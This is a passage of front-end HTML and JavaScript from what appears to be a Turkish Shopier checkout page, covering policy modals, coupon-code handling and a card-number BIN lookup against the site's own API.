                            <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                            </svg>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-primary w-full" type="button" data-bs-dismiss="modal">
                        <span>Kapat</span>
                    </button>
                </div>
            </div>
        </div>
    </div>
</template>
<template id="mobile_privacy_template">
    <div class="offcanvas offcanvas-bottom action-sheet privacy-and-terms-canvas" tabindex="-1" id="privacy-and-terms-sheet" aria-labelledby="privacy-and-terms-sheetLabel">
        <div class="offcanvas-header">
            <button class="hidden" type="button" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            <div class="action-sheet-swipe-btn"></div>
        </div>
        <div class="offcanvas-body">
            <div class="action-sheet-desc">
                <div class="flex justify-center font-semibold text-[20px]">Gizlilik ve Koşullar</div>
                <div class="mt-[40px]">
                    <div class="flex align-center justify-between pb-[14px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="offcanvas" data-bs-target="#shopping-safety-sheet" id="shopping_security" aria-controls="shopping-safety-sheet">
                        <div class="font-normal text-start text-16 pt-1">Alışveriş Güvenliği</div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                    <div class="flex align-center justify-between pt-[11px] pb-[14px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="offcanvas" id="pre_information" aria-controls="pre-information-form-sheet">
                        <div class="font-normal text-start text-16 pt-1">Ön Bilgilendirme Formu </div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                    <div class="flex align-center justify-between pt-[11px] pb-[14px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="offcanvas" id="distance_sale" aria-controls="distance-sales-agreement-sheet">
                        <div class="font-normal text-start text-16 pt-1">Mesafeli Satış Sözleşmesi</div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                    <div class="flex align-center justify-between pt-[11px] pb-[14px] border-b border-[#E2E2E5] cursor-pointer" data-bs-toggle="offcanvas" id="personal_data" aria-controls="personal-data-protection-sheet">
                        <div class="font-normal text-start text-16 pt-1">Kişisel Verilerin Korunması</div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                    <div class="flex align-center justify-between pt-[11px] cursor-pointer mb-[210px]" data-bs-toggle="offcanvas" id="refund" aria-controls="return-terms-sheet">
                        <div class="font-normal text-start text-16 pt-1">İade Koşulları</div>
                        <span class="mt-0.5">
                        <svg width="24" height="24" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.93974 13.78C5.81307 13.78 5.68641 13.7333 5.58641 13.6333C5.39307 13.44 5.39307 13.12 5.58641 12.9267L9.93307 8.58001C10.2531 8.26001 10.2531 7.74001 9.93307 7.42001L5.58641 3.07335C5.39307 2.88001 5.39307 2.56001 5.58641 2.36668C5.77974 2.17335 6.09974 2.17335 6.29307 2.36668L10.6397 6.71335C10.9797 7.05335 11.1731 7.51335 11.1731 8.00001C11.1731 8.48668 10.9864 8.94668 10.6397 9.28668L6.29307 13.6333C6.19307 13.7267 6.06641 13.78 5.93974 13.78Z" fill="currentColor"></path>
                    </svg>
                    </span>
                    </div>
                </div>
            </div>
        </div>
        <div class="offcanvas-footer">
            <div class="action-sheet-footer">
                <button class="btn btn-primary w-full" type="button" data-bs-dismiss="offcanvas">
                    <span>Kapat</span></button>
            </div>
        </div>
    </div>
</template>

<script>
    /* Security modal function. Put here because we call in custom.js*/
    function renderPrivacyModals() {
                const footer = document.querySelector('footer');
        const oldModal = document.querySelector('#privacy-and-terms-sheet, #privacy-and-terms-modal');

        if (oldModal) {
            oldModal.remove();
        }

        const templateId = isMobileView ? 'mobile_privacy_template' : 'desktop_privacy_template';
        const templateContent = document.getElementById(templateId).innerHTML;

        if (footer) {
            footer.insertAdjacentHTML('beforebegin', templateContent);
        }
            }

    function renderTrackOrderModals() {
            }

    function createSecureModals() {
        document.querySelectorAll('.secure_toast')?.forEach(toast => toast.remove());
        const canvasHTML = `<div class="offcanvas offcanvas-bottom action-sheet privacy-and-terms-2-canvas secure_toast" id="secure_canvas" tabindex="-1"
     aria-labelledby="shopping-safety-sheetLabel">
    <div class="offcanvas-header">
        <button class="hidden" type="button" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        <div class="action-sheet-swipe-btn"></div>
    </div>
    <div class="offcanvas-body">
        <div class="scroll-effect"></div>
        <div class="action-sheet-desc">
            <div class="flex justify-center font-semibold text-[20px] relative">
                <svg class="absolute left-0 top-0" width="24" height="24" viewBox="0 0 24 24" fill="none"
                     xmlns="http://www.w3.org/2000/svg" data-bs-toggle="offcanvas"
                     data-bs-target="#privacy-and-terms-sheet" aria-controls="privacy-and-terms-sheet">
                    <path d="M15.0003 20.67C14.8103 20.67 14.6203 20.6 14.4703 20.45L7.95027 13.93C6.89027 12.87 6.89027 11.13 7.95027 10.07L14.4703 3.55002C14.7603 3.26002 15.2403 3.26002 15.5303 3.55002C15.8203 3.84002 15.8203 4.32002 15.5303 4.61002L9.01027 11.13C8.53027 11.61 8.53027 12.39 9.01027 12.87L15.5303 19.39C15.8203 19.68 15.8203 20.16 15.5303 20.45C15.3803 20.59 15.1903 20.67 15.0003 20.67Z"
                          fill="currentColor"/>
                </svg>
                <span class="mr-[19px] toast-title"></span>
            </div>
            <div class="mt-[29px] max-h-[468px] overflow-y-auto scrollable-content privacy-and-terms-content-sheet-scroll">
                <div class="relative privacy-and-terms-content-sheet pr-[19px]">
                    <div class="font-normal text-start text-15 leading-[18px] toast-text"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="offcanvas-footer">
        <div class="action-sheet-footer">
            <button class="btn btn-primary w-full" type="button" data-bs-toggle="offcanvas"
                    data-bs-target="#privacy-and-terms-sheet" aria-controls="privacy-and-terms-sheet">
                <span>Kapat</span>
            </button>
        </div>
    </div>
</div>`;
        const modalHTML = `<div class="modal fade modal-privacy-and-terms-2 secure_toast" id="secure_modal" tabindex="-1">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-body">
                <div class="scroll-effect"></div>
                <div class="mt-[27px] flex justify-center font-semibold text-[20px] relative pr-[19px]">
                    <svg
                            class="absolute left-[32px] top-[-1px] cursor-pointer" width="24" height="24" viewBox="0 0 24 24"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg" data-bs-toggle="modal"
                            data-bs-target="#privacy-and-terms-modal">
                        <path
                                d="M15.0003 20.67C14.8103 20.67 14.6203 20.6 14.4703 20.45L7.95027 13.93C6.89027 12.87 6.89027 11.13 7.95027 10.07L14.4703 3.55002C14.7603 3.26002 15.2403 3.26002 15.5303 3.55002C15.8203 3.84002 15.8203 4.32002 15.5303 4.61002L9.01027 11.13C8.53027 11.61 8.53027 12.39 9.01027 12.87L15.5303 19.39C15.8203 19.68 15.8203 20.16 15.5303 20.45C15.3803 20.59 15.1903 20.67 15.0003 20.67Z"
                                fill="currentColor"/>
                    </svg>
                    <span class="mt-[1px] toast-title"></span>
                </div>
                <div class="mt-[34px] max-h-[414px] overflow-y-auto scrollable-content privacy-and-terms-content-modal-scroll">
                    <div class="relative privacy-and-terms-content-modal pr-[19px]">
                        <div class="font-normal text-start text-15 toast-text">
                        </div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-primary w-full" type="button" data-bs-toggle="modal"
                        data-bs-target="#privacy-and-terms-modal"><span>Kapat</span></button>
            </div>
        </div>
    </div>
</div>
`;
        const footer = document.querySelector('footer');
        if (footer) {
            const selectedHTML = isMobileView ? canvasHTML : modalHTML;
            footer.insertAdjacentHTML('beforebegin', selectedHTML);
        }
    }

    function showSecureModal(args) {
        const {
            title = '',
            message = '',
        } = args
        let toastSection = document.querySelector(".secure_toast");
        let modal;
        let modalElement;

        toastSection.querySelector('.toast-title').innerHTML = title;
        toastSection.querySelector('.toast-text').innerHTML = message;
        if (isMobileView) {
            modalElement = document.getElementById('secure_canvas');
            modal = new bootstrap.Offcanvas(modalElement);
            modalElement.addEventListener('shown.bs.offcanvas', function handleShown() {
                toastSection.querySelector('.scrollable-content').scrollTo({ top: 0, behavior: 'instant' });
                modalElement.removeEventListener('shown.bs.offcanvas', handleShown);
            });
        } else {
            modalElement = document.getElementById('secure_modal');
            modal = new bootstrap.Modal(modalElement);
            modalElement.addEventListener('shown.bs.modal', function handleShown() {
                toastSection.querySelector('.scrollable-content').scrollTo({ top: 0, behavior: 'instant' });
                modalElement.removeEventListener('shown.bs.modal', handleShown);
            });
        }
        modal.show();
    }

    /* This makes html content usable in showSecureModal function */
    function convertModalContent(id) {
        const url = 'https://www.shopier.com/s/api/v1/get_policies/KQR';
        const data = "policy=" + id;

        return new Promise((resolve, reject) => {
            let xhr = new XMLHttpRequest();
            xhr.open('POST', url);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        resolve(xhr.responseText);
                    } else {
                        handleHttpError(xhr.status);
                        reject(new Error(`HTTP Error: ${xhr.status}`));
                    }
                }
            };
            xhr.send(data);
        });
    }

    function initializeSecureModals() {
        const modalConfigs = [
                        { id: 'shopping_security', contentId: '#shopping-secure', title: 'Alışveriş Güvenliği' },
            { id: 'pre_information', contentId: '#preliminary-information-form', title: 'Ön Bilgilendirme Formu ' },
            { id: 'distance_sale', contentId: '#distance-selling-contract', title: 'Mesafeli Satış Sözleşmesi' },
            { id: 'personal_data', contentId: '#protection-of-personal-data', title: 'Kişisel Verilerin Korunması' },
            { id: 'refund', contentId: '#refund-terms', title: 'İade Koşulları' }
                    ];

        modalConfigs.forEach(({ id, contentId, title }) => {
            const element = document.getElementById(id);
            element?.addEventListener('click', async function () {
                const content = await convertModalContent(contentId);
                showSecureModal({ title, message: content });
            });
        });
    }
    document?.addEventListener("DOMContentLoaded", function () {
        createSecureModals();
        initializeSecureModals();
    });


    </script>
<script>
    const inputCreditCardList = document.querySelectorAll('.js-input-credit-card');

    inputCreditCardList.forEach((inputCreditCard) => {
        const input = inputCreditCard.querySelector('input');
        const badges = Array.from(inputCreditCard.querySelectorAll('.credit-card-badge'));
        const wrapper = inputCreditCard.querySelector('.input-icon');
        const width = Number(getComputedStyle(wrapper).getPropertyValue('--width').split('px')[0]);
        const pr = Number(getComputedStyle(wrapper).getPropertyValue('--padding-right').split('px')[0]);
        const gap = Number(getComputedStyle(wrapper).getPropertyValue('--gap').split('px')[0]);
        calculateCardBadgesPosition({ width, pr, gap, badges, input });
        input.addEventListener('input', () => {
            calculateCardBadgesPosition({ width, pr, gap, badges, input });
        });
    });

    function calculateCardBadgesPosition({ width, pr, gap, badges, input }) {
        let count = 0;
        for (let index = 0; index < badges.length; index++) {
            if (input.value.replace(/\s/g, '').length < 6) {
                document.getElementById('card_type').value = '';
                count++;
                const transform = -1 * ((count - 1) * width + (count - 2) * gap + pr);
                badges[index].style.setProperty('--transform', transform + 'px');
            }
        }
    }
    document.body.classList.add('payment');
    
    function handleGenericErrors(args) {
        const {
            status,
            message,
            valid_type,
            message_type,
            min_value_cart,
            card_logo,
            brand
        } = args;

        switch (status) {
            case 'fail':
                if (message_type) {
                    switch (message_type) {
                        case 'coupon_code_invalid_code':
                            showInvalidModal({icon:'<div class="bg-info"></div>',title: `Geçersiz indirim kodu`, message: 'Lütfen geçerli bir indirim kodu girin.'})
                            let couponButton = document.querySelector('.input-apply');
                            if (couponButton) {
                                let spanText = couponButton.querySelector('span');
                                couponButton.setAttribute('disabled','')
                                spanText.classList.add('text-black-50');
                            }
                            break;
                        case 'coupon_code_only_one_applied':
                            showInvalidModal({message:"İndirim kodu sadece bir kez uygulanabilir."});
                            break;
                        case 'coupon_code_must_above_order_price_1':
                        default:
                            switch (valid_type) {
                                case 'cart_total_quantity_less_than_coupon_value':
                                    showInvalidModal({message: "İndirim kodundan faydalanmak için sepete en az " +min_value_cart + " ürün eklenmeli."});
                                    break;
                                case 'cart_total_price_less_than_coupon_value':
                                    showInvalidModal({message: "Bu kod en az " + min_value_cart + " değerindeki siparişler için kullanılabilir."});
                                    break;
                                default:
                                    showInvalidModal({message: message});
                                    break;
                            }
                    }
                }
                break;
            case 'installment_disabled':
                document.getElementById('card_type').value = brand;
                if (card_logo !== undefined) {
                    const cardNetworks = document.querySelectorAll('.card-network-logo');
                    cardNetworks.forEach(card=>{
                        if (card.getAttribute('data-value') === card_logo){
                            card.style.setProperty('--transform', '-9px');
                        } else{
                            card.style.removeProperty('--transform');
                        }
                    })
                }
                            break;
            case 'generic_error':
                showInvalidModal({message: message});

                break;
            case 'blank':
                break;
            default:
                showToast(true, "danger", "Beklenmeyen bir hata oluştu, lütfen bir süre sonra tekrar deneyiniz.", "X");
                break;
        }
    }


    function dropdownCreator(htmlContent, id) {
        const selectElement = document.getElementById(id);
        if (selectElement) {
            selectElement.classList.add('!hidden');
            selectElement.insertAdjacentHTML('afterend', htmlContent);
        }
    }


    function selectOptions(id) {
        if (document.getElementById(id)) {
            document.getElementById(`dropdown_items_${id}`)?.addEventListener('mouseup', function (e) {
                if (e.target && e.target.closest('.dropdown-item')) {
                    const selectSection = document.getElementById(id);
                    const dropdownElement = document.getElementById(`${id}_clone`);
                    const dropdownItemParent = e.target.closest('.dropdown-item');
                    const dropdownSelected = dropdownElement.querySelector('.dropdown-selected');
                    const selectedValue = dropdownItemParent.getAttribute('data-value');
                    const selectedText = dropdownItemParent.querySelector('.input-name').textContent;
                    if (isMobileView) {
                        selectSection.value = selectedValue;
                        dropdownSelected.setAttribute('data-value', selectedValue);
                        const advList = document.getElementById('dropdown_items_adv');
                        const advItems = advList.querySelectorAll('.dropdown-item');
                        advItems.forEach(item=>{
                            item.addEventListener('click', function (){
                                dropdownSelected.textContent = selectedText;
                            })
                        })
                    } else {
                        selectSection.value = selectedValue;
                        dropdownSelected.setAttribute('data-value', selectedValue);
                        dropdownSelected.innerHTML = selectedText;
                    }

                }
            });
        }
    }

    function hideDropdownIfOutsideClicked(id) {
        let isDropdownOpen = false;
        document.addEventListener('click', function (e) {
            if (document.getElementById(`${id}_clone`) && isDropdownOpen) {
                if (!document.getElementById(`${id}_clone`).contains(e.target)) {
                    document.getElementById(`dropdown_items_${id}`).classList.add('dropdown-hide');
                    isDropdownOpen = false;
                }
            }
        });

        if (document.getElementById(`${id}_clone`)) {
            document.getElementById(`${id}_clone`).addEventListener('click', function () {
                isDropdownOpen = !isDropdownOpen;
            });
        }
    }

    function setDropdown(htmlContent, id) {
        dropdownCreator(htmlContent, id);
        selectOptions(id);
        hideDropdownIfOutsideClicked(id)
    }

    let isAdvVisible;

    function enableDropdown() {
            }

    function disableDropdown() {
            }

    function checkSelectedChanged(prev, id) {
        const current = document.querySelector(`.selected-${id}`).getAttribute('data-value');
        if (current !== prev) {
            const changeEvent = new Event('change', {bubbles: true});
            document.getElementById(id).dispatchEvent(changeEvent);
            prev = current;
        }
        return prev
    }

    function showAdvModal() {
        const triggerBtn = document.querySelector('.dropdown-btn-toggle_adv');
        triggerBtn?.addEventListener('click', function () {
            if (!isAdvVisible) {
                showInvalidModal({icon:'<div class="bg-info"></div>',title: `Henüz ödeme bilgilerinizi girmediniz`, message: 'Taksit seçenekleri, kart bilgilerinizi doldurmanızın ardından görünür.'})
            }
        })
    }


    /* DROPDOWN FUNCTIONS END */
    function checkAndSetPaymentDropdown() {
                            }

    checkAndSetPaymentDropdown();

    let formControlCardNumber = document.getElementById('formControlCardNumber');
    document.addEventListener("DOMContentLoaded", () => {
        document.querySelector('#shopier--coupon-code-textbox')?.classList.remove('pointer-events-none')
        const cardCCVInput = document.getElementById('formControlCardCCV');
        cardCCVInput?.addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
        document.querySelector('.btn-form-submit').classList.remove('pointer-events-none');
        const formInputs = document.querySelectorAll('input[type="text"], input[type="email"]');

        function getNextVisibleInput(currentIndex) {
            for (let i = currentIndex + 1; i < formInputs.length; i++) {
                const input = formInputs[i];
                const parentEl = input.closest('.checkout-form-body');
                const parentEl2 = input.closest('.input-text');
                const parentEl3 = input.closest('.input-group');

                if ((parentEl && parentEl.classList.contains('!hidden')) || (parentEl2 && parentEl2.classList.contains('!hidden')) || (parentEl3 && parentEl3.classList.contains('!hidden'))) {
                    continue;
                }

                if (!input.classList.contains('dropdown-search-input') && !input.classList.contains('action-sheet-search-input')) {
                    return input;
                }
            }
            return null;
        }

        formInputs.forEach((input, index) => {
            input.addEventListener("keydown", (event) => {
                if (event.key === "Enter") {
                    event.preventDefault();

                    const nextInput = getNextVisibleInput(index);
                    if (nextInput) {
                        nextInput.focus();
                    } else {
                        input.blur();
                    }
                }
            });
            input.addEventListener("focus", function () {
                if (!input.classList.contains('dropdown-search-input') && !input.classList.contains('action-sheet-search-input')) {
                    const rect = input.getBoundingClientRect();
                    const offset = window.innerHeight / 2 - rect.height / 2;
                    window.scrollTo({
                        top: window.scrollY + rect.top - offset,
                        behavior: "smooth"
                    });
                }
            });
        });

        showAdvModal();
            disableDropdown();
                            formControlCardNumber.addEventListener('change', cardNumberListener, false);
            formControlCardNumber.addEventListener('keyup', cardNumberListener, false);
            formControlCardNumber.addEventListener('paste', function (event){
                setTimeout(() => cardNumberListener(event), 0);
            });
            checkCouponCodeValidity(991135511);
            let couponInput = document.querySelector('.input-apply');
            if (couponInput) {
                let spanText = couponInput.querySelector('span');
                const input = document.getElementById('shopier--coupon-code-textbox');

                input.addEventListener('focus', function () {
                    input.placeholder = '';
                    couponInput.classList.remove('d-none');
                    if (spanText.classList.contains('text-black-50')) {
                        couponInput.setAttribute('disabled', 'disabled');
                    }else{
                        couponInput.removeAttribute('disabled');
                    }
                });

                input.addEventListener('input', function () {
                    if (input.value.trim() !== '') {
                        couponInput.removeAttribute('disabled');
                        spanText.classList.remove('text-black-50');
                        couponInput.classList.remove('pointer-events-none')
                    } else {
                        couponInput.setAttribute('disabled', 'disabled');
                        spanText.classList.add('text-black-50');
                        couponInput.classList.add('pointer-events-none')
                    }
                });

                input.addEventListener('blur', function () {
                    if (input.value.trim() === '') {
                        input.placeholder = 'İndirim kodu girin';
                        couponInput.setAttribute('disabled', 'disabled');
                        couponInput.classList.add('d-none');
                    } else {
                        couponInput.removeAttribute('disabled');
                    }
                });

            }

        let previousCardLength = 0;
            function cardNumberListener(event) {
                let binNumberTemp = formControlCardNumber.value.replace(/[\s-]/g, "");
                /* Eğer kullanıcı harf girerse fonksiyon çalışmamalı */
                if (event.type === "keyup" && !/^\d$/.test(event.key)) {
                    return;
                }

                /* Sadece paste veya change olayında 6dan büyük mü diye bakılmalı. Kullanıcı yazarken tam olarak 6 ya eşit mi diye bakılmalı */
                if ((event.type !== "paste" && binNumberTemp.length === 6) || ((event.type === "paste" || event.type === 'change') && binNumberTemp.length >= 6)) {

                    if (binNumberTemp.length === 16)
                        formControlCardNumber.blur();
                    enableDropdown();
                    isAdvVisible = true;
                    const url = "https://www.shopier.com/s/api/v1/bin_number_control/KQR";
                    const data = 'bin_number=' + binNumberTemp.slice(0, 6);
                    sendRequest('POST', url, data, function (http) {
                            let response = http.response;
                            const {brand, message, bin_number_csrf_token, status, max_installment, card_logo} = response;
                            if (status === 'installment_enabled') {
                                                            } else {
                                handleGenericErrors({
                                    status: status,
                                    card_logo: card_logo,
                                    brand: brand,
                                    message: message
                                })
                            }
                        }
                    )
                } else {
                                    }
            }
        }
    );


    function checkCouponCodeValidity(order_id) {
        const url = "https://www.shopier.com/s/api/v1/coupon_code/KQR";
        let params = "request_type=check_coupon_code_validity" + "&order_id=" + order_id;
        sendRequest('POST', url, params, function (http) {
            let response = http.response;
            const {message, status,message_type,valid_type} = response;
            if (response.status === "ok") {
                const {
                    coupon_price,
                    sub_total_price,
                    total_price,
                    total_discount_price,
                    label_discount_price,
                    discount_name
                } = response.data;
                let inputValue = document.getElementById('shopier--coupon-code-textbox')
                if (inputValue){
                    inputValue.value = discount_name
                    inputValue.setAttribute('disabled','')
                    let applybuttonDiscount = document.getElementById('couponToCartButton')
                    applybuttonDiscount.classList.remove('d-none')
                    applybuttonDiscount.setAttribute('disabled','')
                    let couponInput = document.querySelector('.input-apply');
                    let spanText = couponInput.querySelector('span');
                    spanText.textContent = 'Uygulandı';
                    let svgWrapper = document.createElement('div');
                    svgWrapper.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 25" fill="none"
                             xmlns="http://www.w3.org/2000/svg">
                            <path
                                d="M12 23.25C6.07 23.25 1.25 18.43 1.25 12.5C1.25 6.57 6.07 1.75 12 1.75C17.93 1.75 22.75 6.57 22.75 12.5C22.75 18.43 17.93 23.25 12 23.25ZM12 3.25C6.9 3.25 2.75 7.4 2.75 12.5C2.75 17.6 6.9 21.75 12 21.75C17.1 21.75 21.25 17.6 21.25 12.5C21.25 7.4 17.1 3.25 12 3.25Z"
                                fill="currentColor"/>
                            <path
                                d="M10.5795 16.0796C10.3795 16.0796 10.1895 15.9996 10.0495 15.8596L7.21945 13.0296C6.92945 12.7396 6.92945 12.2596 7.21945 11.9696C7.50945 11.6796 7.98945 11.6796 8.27945 11.9696L10.5795 14.2696L15.7195 9.12961C16.0095 8.83961 16.4895 8.83961 16.7795 9.12961C17.0695 9.41961 17.0695 9.89961 16.7795 10.1896L11.1095 15.8596C10.9695 15.9996 10.7795 16.0796 10.5795 16.0796Z"
                                fill="currentColor"/>
                        </svg>`;
                    spanText.parentNode.insertBefore(svgWrapper, spanText.nextSibling);
                }
                let {
                    price_without_cent: coupon_without_cent,
                    price_cent: coupon_cent,
                    price_symbol,
                    price_code,

                } = coupon_price;
                if (price_code === 'TL') {
                    price_symbol = ''
                } else {
                    price_code = ''
                }
                const {
                    price_without_cent: label_discount_without_cent,
                    price_cent: label_discount_cent,
                    price_formatted
                }=label_discount_price;
                const {
                    price_without_cent: total_discount_without_cent,
                    price_cent: total_discount_cent,
                } = total_discount_price;
                const {
                    price_without_cent: total_without_cent,
                    price_cent: total_cent,
                } = total_price;
                const couponCodeNameHTML = `<div class="checkout-summary-price-subitem">
                    <div>${discount_name}</div>
                    <div>-${price_symbol}${coupon_without_cent}<span>${coupon_cent} ${price_code}</span></div>
                  </div>
                `;
                const  labelDiscountHTML = `<div class="checkout-summary-price-subitem">
                    <div>Etiket indirimi</div>
                    <div>-${price_symbol}${label_discount_without_cent}<span>${label_discount_cent} ${price_code}</span></div>
                  </div>
                `;
                const discountMainHTML =` <div id="basket-discount-total-price-div" class="checkout-summary-price-item">
                        <div id="basket-discount-total-price-name">
                        ${discount_name}
                        </div>
                        <div class="checkout-summary-price-total" id="basket-discount-total-price">-${price_symbol}${coupon_without_cent}<span>${coupon_cent} ${price_code}</span></div>
                    </div>`;
                let basketTotalPrice = document.getElementById('basket-total-price')
                let basketSubTotalPriceDiv = document.getElementById('basket-sub-total-price-div')
                if (price_formatted === '0'){
                    basketSubTotalPriceDiv.classList.remove('!hidden')
                    basketTotalPrice.insertAdjacentHTML('beforebegin',discountMainHTML)
                    document.querySelector('#basket-summary-total-price').innerHTML = price_symbol + total_without_cent + '<span>' + total_cent + ' ' + price_code + '</span>';
                }else{
                    const subDiscountItem = document.querySelector('.checkout-summary-price-subitem');
                    const totalDiscountItem = document.getElementById('basket-discount-total-price-div');
                    const basketDiscountTotalPriceName = document.getElementById('basket-discount-total-price-name')
                    basketDiscountTotalPriceName.innerHTML = 'Toplam indirim'
                    if (subDiscountItem) {
                        subDiscountItem.insertAdjacentHTML('afterend',couponCodeNameHTML);
                        subDiscountItem.insertAdjacentHTML('afterend',labelDiscountHTML);
                    }else {
                        totalDiscountItem.insertAdjacentHTML('afterend',couponCodeNameHTML);
                        totalDiscountItem.insertAdjacentHTML('afterend',labelDiscountHTML);
                    }
                    let basketDiscountTotalPriceDiv = document.getElementById('basket-discount-total-price-div')
                    basketDiscountTotalPriceDiv.classList.remove('!hidden')
                    document.querySelector('#basket-discount-total-price').innerHTML = '-'+ price_symbol + total_discount_without_cent + '<span>' + total_discount_cent + ' ' + price_code + '</span>';
                    document.querySelector('#basket-summary-total-price').innerHTML = price_symbol + total_without_cent + '<span>' + total_cent + ' ' + price_code + '</span>';
                    let basketSummaryDiscountName = document.querySelector('#basket-summary-discount-name')
                    let basketSummaryDiscountValue =document.querySelector('#basket-summary-discount-value')
                    if(basketSummaryDiscountName){
                        basketSummaryDiscountName.innerHTML = discount_name;
                    }
                    if(basketSummaryDiscountValue){
                        basketSummaryDiscountValue.innerHTML = '-' + price_symbol + coupon_without_cent + '<span>' + coupon_cent + ' ' + price_code + '</span>';
                    }
                }
            } else if (response.status === "fail") {
                if(message_type) {
                    const {min_value_cart} = message_type;
                    handleGenericErrors({
                        status: status,
                        message_type: message_type,
                        message: message,
                        valid_type: valid_type,
                        min_value_cart: min_value_cart
                    })
                } else {
                    handleGenericErrors({
                        status: status,
                        message_type: "default",
                        message: message,
                        valid_type: valid_type,
                    })
                }
            }
        })
    }

    function addCouponCodeToCart(couponCode) {
        let adv = document.querySelector('#adv') && document.querySelector('#adv').value ? parseInt(document.querySelector('#adv').value) : 0;
        const url = 'https://www.shopier.com/s/api/v1/coupon_code/KQR';
        let params = "request_type=add_coupon_code" +
            "&coupon_code=" + couponCode +
            "&adv=" + adv +
            "&order_id=991135511";
        sendRequest('POST', url, params, function (http) {
            let response = http.response;
            const {message, valid_type, message_type, data, status} = response;
            if (status === "ok") {
                if( valid_type === 'coupon_code_need_requirement_for_applicable') {
                    window.scrollTo({top: 0, behavior: 'smooth'});
                    document.querySelector("#discount-bar")?.classList.remove('!hidden');
                    document.querySelector("#discount-bar")?.classList.add('discount-main-layout');
                    document.querySelector(".notification-bar")?.setAttribute('data-discount-id', response.discount_id);
                    document.querySelector(".notification-bar")?.setAttribute('data-clickable', response.clickable);
                    document.querySelector("#discount-bar .notification-bar-body p").innerHTML = message.result;
                    if(message.button != null) {
                        let additionalText = `<a class="notification-bar-action-btn" type="button">
                            <span>${message.button}</span>
                        </a>`;
                        let notiBarButton = document.getElementById("notification-bar-button")
                        if (notiBarButton) {
                            notiBarButton.classList.remove('!hidden')
                            notiBarButton.innerHTML = additionalText;
                        }
                    }
                    return false;
                }
                const {
                    coupon_price,
                    sub_total_price,
                    total_price,
                    total_discount_price,
                    discount_name,
